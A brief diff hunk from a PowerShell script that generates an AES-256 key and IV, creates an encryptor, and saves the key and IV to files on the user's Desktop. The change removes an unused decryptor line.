@@ -6,7 +6,6 @@ $AES.KeySize = 256
 $AES.GenerateKey()
 $AES.GenerateIV()
 $Encryptor = $AES.CreateEncryptor()
-$Decryptor = $AES.CreateDecryptor()
 $UserPath = "$($env:USERPROFILE)\Desktop"
 $AES.Key | Set-Content $UserPath\key.s
 $AES.IV | Set-Content $UserPath\IV.s
